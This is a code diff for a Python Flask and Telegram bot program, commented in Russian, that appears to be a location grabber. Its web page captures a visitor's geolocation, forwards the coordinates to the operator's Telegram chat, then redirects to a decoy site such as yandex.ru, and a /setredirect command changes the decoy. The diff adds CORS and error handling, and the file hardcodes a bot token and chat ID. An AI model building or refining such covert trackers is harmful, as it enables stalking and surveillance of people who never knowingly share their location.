@@ -3,37 +3,31 @@ import requests
 import telebot
 import threading
 import os
+from flask_cors import CORS
 
 BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
 CHAT_ID = 651911888
-REDIRECT_FILE = 'redirect_url.txt'
 
 app = Flask(__name__)
+CORS(app)
+
 bot = telebot.TeleBot(BOT_TOKEN)
 
-def get_redirect_url():
-    try:
-        with open(REDIRECT_FILE, 'r') as f:
-            url = f.read().strip()
-            if url:
-                return url
-    except FileNotFoundError:
-        pass
-    return 'https://yandex.ru'  # URL по умолчанию
-
-def set_redirect_url(url):
-    with open(REDIRECT_FILE, 'w') as f:
-        f.write(url)
+# Редирект по умолчанию и переменная для хранения текущего редиректа
+redirect_url = 'https://yandex.ru'
 
 def send_to_telegram(lat, lon):
     text = f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}"
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data = {"chat_id": CHAT_ID, "text": text}
-    requests.post(url, data=data)
+    try:
+        requests.post(url, data=data, timeout=5)
+    except Exception as e:
+        print(f"Ошибка отправки в Telegram: {e}")
 
 @app.route('/')
 def serve_index():
-    url = get_redirect_url()
+    global redirect_url
     html = f'''
     <!DOCTYPE html>
     <html>
@@ -50,11 +44,11 @@ def serve_index():
             }})
         }});
         setTimeout(() => {{
-            window.location.href = "{url}";
+            window.location.href = "{redirect_url}";
         }}, 1500);
     }}, err => {{
         setTimeout(() => {{
-            window.location.href = "{url}";
+            window.location.href = "{redirect_url}";
         }}, 1500);
     }});
     </script>
@@ -75,11 +69,12 @@ def send_location():
 
 @bot.message_handler(commands=['setredirect'])
 def cmd_setredirect(message):
+    global redirect_url
     args = message.text.split(maxsplit=1)
     if len(args) == 2:
         url = args[1].strip()
         if url.startswith('http://') or url.startswith('https://'):
-            set_redirect_url(url)
+            redirect_url = url
             bot.reply_to(message, f"✅ Редирект установлен на:\n{url}")
         else:
             bot.reply_to(message, "❌ Ошибка: ссылка должна начинаться с http:// или https://")
